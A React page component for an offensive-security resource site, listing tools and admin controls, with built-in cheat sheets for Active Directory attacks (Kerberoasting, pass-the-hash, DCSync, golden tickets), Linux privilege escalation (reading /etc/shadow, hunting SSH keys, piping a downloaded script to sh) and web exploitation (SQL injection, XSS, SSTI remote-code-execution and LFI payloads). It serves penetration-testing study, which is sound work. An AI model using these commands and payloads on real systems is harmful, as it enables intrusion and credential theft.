import { useState, useEffect } from "react";
import { resourceAPI, adminAPI } from "@/lib/api";
import { useAdmin } from "@/context/AdminContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import SEO from "@/components/SEO";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { toast } from "sonner";
import { 
  ExternalLink, 
  Plus, 
  Trash2, 
  FileText, 
  Wrench, 
  BookOpen, 
  ClipboardList,
  ChevronDown,
  ChevronRight,
  Terminal,
  Copy
} from "lucide-react";

const ResourcesPage = () => {
  const { isAuthenticated, getAuthHeader } = useAdmin();
  const [resources, setResources] = useState([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState("");
  const [dialogOpen, setDialogOpen] = useState(false);
  const [expandedChecklist, setExpandedChecklist] = useState(null);
  const [newResource, setNewResource] = useState({
    title: "",
    description: "",
    url: "",
    content: "",
    category: "tools"
  });

  useEffect(() => {
    fetchResources();
  }, [filter]);

  const fetchResources = async () => {
    try {
      const response = await resourceAPI.getAll(filter || undefined);
      setResources(response.data);
    } catch (error) {
      console.error("Failed to fetch resources:", error);
    } finally {
      setLoading(false);
    }
  };

  const handleCreateResource = async (e) => {
    e.preventDefault();
    try {
      await adminAPI.createResource(newResource, getAuthHeader());
      toast.success("Resource added!");
      setNewResource({ title: "", description: "", url: "", content: "", category: "tools" });
      setDialogOpen(false);
      fetchResources();
    } catch (error) {
      toast.error("Failed to add resource");
    }
  };

  const handleDeleteResource = async (id) => {
    if (!window.confirm("Delete this resource?")) return;
    try {
      await adminAPI.deleteResource(id, getAuthHeader());
      toast.success("Resource deleted");
      fetchResources();
    } catch (error) {
      toast.error("Failed to delete resource");
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied to clipboard");
  };

  const getCategoryIcon = (category) => {
    const icons = {
      tools: <Wrench className="w-5 h-5" />,
      checklists: <ClipboardList className="w-5 h-5" />,
      notes: <BookOpen className="w-5 h-5" />,
      templates: <FileText className="w-5 h-5" />
    };
    return icons[category] || icons.tools;
  };

  const getCategoryLabel = (category) => {
    const labels = {
      tools: "Tools",
      checklists: "Checklists",
      notes: "Notes & Guides",
      templates: "Templates"
    };
    return labels[category] || category;
  };

  const categories = ["checklists", "tools", "notes", "templates"];

  // Default resources with actual useful content
  const defaultResources = [
    // Checklists
    {
      id: "default-ad-checklist",
      title: "Active Directory Attack Checklist",
      description: "Comprehensive AD enumeration and attack methodology",
      category: "checklists",
      content: `# Active Directory Attack Checklist

## Initial Enumeration
- [ ] Run bloodhound-python or SharpHound
- [ ] Enumerate users: Get-ADUser -Filter * | Select Name,SamAccountName
- [ ] Enumerate groups: Get-ADGroup -Filter * | Select Name
- [ ] Find Domain Admins: Get-ADGroupMember "Domain Admins"
- [ ] Check for AS-REP roastable users
- [ ] Check for Kerberoastable accounts

## Credential Attacks
- [ ] AS-REP Roasting: GetNPUsers.py domain/ -usersfile users.txt -no-pass
- [ ] Kerberoasting: GetUserSPNs.py domain/user:pass -request
- [ ] Password Spraying (careful with lockouts)
- [ ] LLMNR/NBT-NS Poisoning with Responder

## Lateral Movement
- [ ] Pass-the-Hash: crackmapexec smb IP -u user -H hash
- [ ] Pass-the-Ticket: export KRB5CCNAME=ticket.ccache
- [ ] Overpass-the-Hash: getTGT.py domain/user -hashes :NTLM
- [ ] Check for admin access: crackmapexec smb IP -u user -p pass

## Privilege Escalation
- [ ] Check for DCSync rights
- [ ] Check for WriteDACL permissions
- [ ] Look for GenericAll/GenericWrite
- [ ] Unconstrained Delegation
- [ ] Constrained Delegation
- [ ] Resource-Based Constrained Delegation

## Domain Dominance
- [ ] DCSync: secretsdump.py domain/admin@DC -just-dc
- [ ] Golden Ticket: ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain domain Admin
- [ ] Silver Ticket for specific services`
    },
    {
      id: "default-linux-privesc",
      title: "Linux Privilege Escalation Checklist",
      description: "Essential Linux privesc enumeration steps",
      category: "checklists",
      content: `# Linux Privilege Escalation Checklist

## Quick Wins
\`\`\`bash
sudo -l                           # Check sudo permissions
find / -perm -4000 2>/dev/null    # Find SUID binaries
cat /etc/crontab                  # Check cron jobs
ls -la /etc/cron.*                # Cron directories
\`\`\`

## System Enumeration
\`\`\`bash
uname -a                          # Kernel version
cat /etc/os-release               # OS info
env                               # Environment variables
cat /etc/passwd                   # Users
cat /etc/shadow                   # Hashes (if readable)
\`\`\`

## Interesting Files
\`\`\`bash
find / -name "*.txt" 2>/dev/null | head
find / -name "id_rsa" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
cat ~/.bash_history
\`\`\`

## Network
\`\`\`bash
netstat -tulnp                    # Listening ports
ss -tulnp                         # Alternative
cat /etc/hosts                    # Hosts file
\`\`\`

## Capabilities
\`\`\`bash
getcap -r / 2>/dev/null           # Find binaries with capabilities
\`\`\`

## Automated Tools
\`\`\`bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# pspy (process monitoring)
./pspy64
\`\`\``
    },
    {
      id: "default-web-checklist",
      title: "Web Exploitation Notes",
      description: "Common web vulnerabilities and testing methodology",
      category: "checklists",
      content: `# Web Exploitation Notes

## Reconnaissance
\`\`\`bash
# Directory enumeration
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
feroxbuster -u http://target -w wordlist.txt

# Subdomain enumeration
ffuf -w subdomains.txt -u http://FUZZ.target.com
\`\`\`

## SQL Injection
\`\`\`
# Basic tests
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
' UNION SELECT NULL--
' UNION SELECT 1,2,3--

# SQLMap
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T tablename --dump
\`\`\`

## XSS Payloads
\`\`\`html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
\`\`\`

## SSTI (Server-Side Template Injection)
\`\`\`
# Detection
{{7*7}}
${7*7}
<%= 7*7 %>

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig RCE
{{['id']|filter('system')}}
\`\`\`

## LFI/RFI
\`\`\`
# Basic LFI
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd

# PHP Wrappers
php://filter/convert.base64-encode/resource=index.php
php://input (POST data)
\`\`\``
    },
    // Tools
    {
      id: "default-tool-nmap",
      title: "Nmap",
      description: "Network exploration and security auditing tool",
      url: "https://nmap.org",
      category: "tools"
    },
    {
      id: "default-tool-burp",
      title: "Burp Suite",
      description: "Web application security testing platform",
      url: "https://portswigger.net/burp",
      category: "tools"
    },
    {
      id: "default-tool-hashcat",
      title: "Hashcat",
      description: "Advanced password recovery utility",
      url: "https://hashcat.net/hashcat",
      category: "tools"
    },
    {
      id: "default-tool-bloodhound",
      title: "BloodHound",
      description: "Active Directory reconnaissance and attack path visualization",
      url: "https://github.com/BloodHoundAD/BloodHound",
      category: "tools"
    },
    {
      id: "default-tool-impacket",
      title: "Impacket",
      description: "Python classes for working with network protocols",
      url: "https://github.com/SecureAuthCorp/impacket",
      category: "tools"
    },
    {
      id: "default-tool-gtfobins",
      title: "GTFOBins",
      description: "Unix binaries that can be exploited for privilege escalation",
      url: "https://gtfobins.github.io",
      category: "tools"
    },
    // Notes
    {
      id: "default-note-payloads",
      title: "PayloadsAllTheThings",
      description: "Comprehensive list of payloads for web application security",
      url: "https://github.com/swisskyrepo/PayloadsAllTheThings",
      category: "notes"
    },
    {
      id: "default-note-hacktricks",
      title: "HackTricks",
      description: "Extensive hacking tricks and techniques documentation",
      url: "https://book.hacktricks.xyz",
      category: "notes"
    },
    // Templates
    {
      id: "default-template-oscp",
      title: "OSCP Report Template",
      description: "Professional penetration testing report template",
      url: "https://github.com/noraj/OSCP-Exam-Report-Template-Markdown",
      category: "templates"
    }
  ];

  // Combine default resources with database resources
  const allResources = [...resources, ...defaultResources.filter(d => !resources.some(r => r.title === d.title))];
  const filteredResources = filter 
    ? allResources.filter(r => r.category === filter)
    : allResources;

  // Group resources by category
  const groupedResources = categories.reduce((acc, cat) => {
    acc[cat] = filteredResources.filter(r => r.category === cat);
    return acc;
  }, {});

  return (
    <div className="min-h-screen py-12" data-testid="resources-page">
      <SEO 
        title="Resources"
        description="Curated offensive security tools, checklists, cheat sheets, and reference materials for penetration testing and red team operations."
      />
      <div className="max-w-7xl mx-auto px-6 md:px-12">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center gap-2 mb-2 font-mono text-sm text-text-muted">
            <span className="text-accent-primary">$</span>
            <span>cat /opt/tools/arsenal.md</span>
          </div>
          <div className="flex items-start justify-between">
            <div>
              <h1 className="font-heading font-bold text-3xl md:text-4xl text-text-primary">
                Resources
              </h1>
              <p className="text-text-muted mt-2">
                Curated tools, checklists, and reference materials for offensive security
              </p>
            </div>
            {isAuthenticated && (
              <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
                <DialogTrigger asChild>
                  <Button className="btn-primary" data-testid="add-resource-btn">
                    <Plus className="w-4 h-4 mr-2" />
                    Add Resource
                  </Button>
                </DialogTrigger>
                <DialogContent className="bg-background-surface border-border max-w-2xl">
                  <DialogHeader>
                    <DialogTitle className="font-heading text-text-primary">Add Resource</DialogTitle>
                  </DialogHeader>
                  <form onSubmit={handleCreateResource} className="space-y-4 mt-4">
                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Label className="text-text-secondary text-sm font-mono">Title</Label>
                        <Input
                          value={newResource.title}
                          onChange={(e) => setNewResource({ ...newResource, title: e.target.value })}
                          className="input-field"
                          required
                          data-testid="resource-title-input"
                        />
                      </div>
                      <div className="space-y-2">
                        <Label className="text-text-secondary text-sm font-mono">Category</Label>
                        <Select
                          value={newResource.category}
                          onValueChange={(value) => setNewResource({ ...newResource, category: value })}
                        >
                          <SelectTrigger className="input-field" data-testid="resource-category-select">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent className="bg-background-surface border-border">
                            {categories.map((cat) => (
                              <SelectItem key={cat} value={cat}>{getCategoryLabel(cat)}</SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                    </div>
                    <div className="space-y-2">
                      <Label className="text-text-secondary text-sm font-mono">Description</Label>
                      <Input
                        value={newResource.description}
                        onChange={(e) => setNewResource({ ...newResource, description: e.target.value })}
                        className="input-field"
                        required
                        data-testid="resource-description-input"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-text-secondary text-sm font-mono">URL (optional)</Label>
                      <Input
                        value={newResource.url}
                        onChange={(e) => setNewResource({ ...newResource, url: e.target.value })}
                        className="input-field"
                        placeholder="https://..."
                        data-testid="resource-url-input"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-text-secondary text-sm font-mono">Content (for checklists/notes)</Label>
                      <Textarea
                        value={newResource.content}
                        onChange={(e) => setNewResource({ ...newResource, content: e.target.value })}
                        className="input-field min-h-32 font-mono text-sm"
                        placeholder="Markdown content..."
                        data-testid="resource-content-input"
                      />
                    </div>
                    <Button type="submit" className="btn-primary w-full" data-testid="resource-submit-btn">
                      Add Resource
                    </Button>
                  </form>
                </DialogContent>
              </Dialog>
            )}
          </div>
        </div>

        {/* Category Filter */}
        <div className="flex flex-wrap gap-4 mb-8">
          <Button
            variant={filter === "" ? "default" : "ghost"}
            onClick={() => setFilter("")}
            className={filter === "" ? "bg-accent-primary text-black" : "text-text-muted hover:text-accent-primary"}
            data-testid="filter-all"
          >
            All
          </Button>
          {categories.map((cat) => (
            <Button
              key={cat}
              variant={filter === cat ? "default" : "ghost"}
              onClick={() => setFilter(cat)}
              className={filter === cat ? "bg-accent-primary text-black" : "text-text-muted hover:text-accent-primary"}
              data-testid={`filter-${cat}`}
            >
              {getCategoryIcon(cat)}
              <span className="ml-2">{getCategoryLabel(cat)}</span>
            </Button>
          ))}
        </div>

        {/* Resources by Category */}
        {loading ? (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {[...Array(6)].map((_, i) => (
              <div key={i} className="bg-background-surface border border-border p-6 animate-pulse">
                <div className="h-6 bg-background-surface-highlight w-1/2 mb-4" />
                <div className="h-4 bg-background-surface-highlight w-full mb-2" />
                <div className="h-4 bg-background-surface-highlight w-3/4" />
              </div>
            ))}
          </div>
        ) : (
          <div className="space-y-12">
            {categories.map((category) => {
              const categoryResources = groupedResources[category];
              if (filter && filter !== category) return null;
              if (categoryResources.length === 0) return null;

              return (
                <section key={category}>
                  <h2 className="font-heading font-bold text-xl text-text-primary mb-6 flex items-center gap-2">
                    {getCategoryIcon(category)}
                    <span>{getCategoryLabel(category)}</span>
                    <span className="text-text-muted font-mono text-sm">({categoryResources.length})</span>
                  </h2>

                  {category === "checklists" ? (
                    // Checklists get expandable view
                    <div className="space-y-4">
                      {categoryResources.map((resource) => (
                        <div 
                          key={resource.id} 
                          className="bg-background-surface border border-border"
                        >
                          <button
                            onClick={() => setExpandedChecklist(expandedChecklist === resource.id ? null : resource.id)}
                            className="w-full p-6 flex items-center justify-between text-left hover:bg-white/5 transition-colors"
                            data-testid={`checklist-${resource.id}`}
                          >
                            <div>
                              <h3 className="font-heading font-bold text-text-primary">
                                {resource.title}
                              </h3>
                              <p className="text-text-muted text-sm mt-1">
                                {resource.description}
                              </p>
                            </div>
                            {expandedChecklist === resource.id ? (
                              <ChevronDown className="w-5 h-5 text-accent-primary" />
                            ) : (
                              <ChevronRight className="w-5 h-5 text-text-muted" />
                            )}
                          </button>
                          {expandedChecklist === resource.id && resource.content && (
                            <div className="border-t border-border p-6">
                              <div className="flex justify-end mb-4">
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => copyToClipboard(resource.content)}
                                  className="text-text-muted hover:text-accent-primary"
                                >
                                  <Copy className="w-4 h-4 mr-2" />
                                  Copy
                                </Button>
                              </div>
                              <pre className="bg-background border border-border p-4 overflow-x-auto font-mono text-sm text-text-secondary whitespace-pre-wrap">
                                {resource.content}
                              </pre>
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  ) : (
                    // Other categories get card view
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                      {categoryResources.map((resource) => (
                        <div 
                          key={resource.id} 
                          className="bg-background-surface border border-border p-6 hover:border-accent-primary/50 transition-colors group"
                        >
                          <div className="flex items-start justify-between mb-3">
                            <span className="text-accent-primary">
                              {getCategoryIcon(resource.category)}
                            </span>
                            {isAuthenticated && !resource.id.startsWith("default") && (
                              <Button
                                variant="ghost"
                                size="sm"
                                className="text-text-muted hover:text-accent-danger opacity-0 group-hover:opacity-100 transition-opacity"
                                onClick={() => handleDeleteResource(resource.id)}
                                data-testid={`delete-resource-${resource.id}`}
                              >
                                <Trash2 className="w-4 h-4" />
                              </Button>
                            )}
                          </div>
                          <h3 className="font-heading font-bold text-lg text-text-primary mb-2">
                            {resource.title}
                          </h3>
                          <p className="text-text-secondary text-sm mb-4 line-clamp-2">
                            {resource.description}
                          </p>
                          {resource.url && (
                            <a
                              href={resource.url}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="inline-flex items-center gap-2 text-accent-primary hover:underline text-sm font-mono"
                              data-testid={`resource-link-${resource.id}`}
                            >
                              Visit
                              <ExternalLink className="w-3 h-3" />
                            </a>
                          )}
                        </div>
                      ))}
                    </div>
                  )}
                </section>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
};

export default ResourcesPage;
